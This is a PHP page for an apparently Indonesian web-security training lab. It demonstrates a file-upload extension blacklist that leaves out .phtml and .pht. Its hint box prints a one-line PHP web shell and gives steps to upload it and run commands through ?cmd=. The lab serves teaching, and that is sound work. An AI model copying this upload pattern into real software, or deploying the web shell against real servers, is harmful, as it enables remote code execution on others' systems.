<?php
$title = 'Lab 4: Extension Blacklist Bypass';
$error = ''; $uploaded_name = '';
// NAIVE BLACKLIST: lupa memasukkan varian ekstensi PHP-executable lain seperti .phtml/.pht,
// yang tetap dieksekusi sebagai PHP oleh konfigurasi Apache bawaan (FilesMatch mencakup
// .php, .php3, .php4, .php5, .php7, .pht, .phtml - lihat dokumentasi mod_php).
$blacklist = ['php', 'php3', 'php4', 'php5', 'php7'];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $name = basename($_FILES['file']['name']);
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    if (in_array($ext, $blacklist, true)) {
        $error = "Extension .$ext is blacklisted.";
    } else {
        $dest = __DIR__ . '/uploads/' . $name;
        if (move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
            $uploaded_name = $name;
        } else {
            $error = 'Upload failed.';
        }
    }
}

include 'header.php';
?>

<details class="hint-box">
<summary>Lihat Hint</summary>
<p class="hint">Goal: blacklist memblokir <code>.php</code>, <code>.php3</code>,
<code>.php4</code>, <code>.php5</code>, <code>.php7</code> &mdash; tapi lupa varian lain yang
tetap dieksekusi sebagai PHP oleh Apache secara default:</p>
<pre class="hint">&lt;?php system($_GET['cmd']); ?&gt;</pre>
<p class="hint">Simpan sebagai <code>shell.phtml</code> (atau <code>.pht</code>), upload, lalu
akses <code>uploads/shell.phtml?cmd=id</code>.</p>
</details>

<?php if ($error): ?><div class="error-box"><?php echo htmlspecialchars($error); ?></div><?php endif; ?>
<?php if ($uploaded_name): ?>
<div class="success-box">Uploaded to uploads/<?php echo htmlspecialchars($uploaded_name); ?>
&mdash; <a href="uploads/<?php echo rawurlencode($uploaded_name); ?>?cmd=id" target="_blank">buka &amp; coba ?cmd=id</a></div>
<?php endif; ?>

<form method="post" enctype="multipart/form-data">
  <label>File</label><br>
  <input type="file" name="file"><br>
  <button type="submit">Upload</button>
</form>

<?php
$files = array_diff(scandir(__DIR__ . '/uploads'), ['.', '..']);
if ($files): ?>
<h3>Uploaded files</h3>
<ul class="file-list">
<?php foreach ($files as $f): ?>
  <li><a href="uploads/<?php echo rawurlencode($f); ?>" target="_blank"><?php echo htmlspecialchars($f); ?></a></li>
<?php endforeach; ?>
</ul>
<?php endif; ?>

<?php include 'footer.php'; ?>
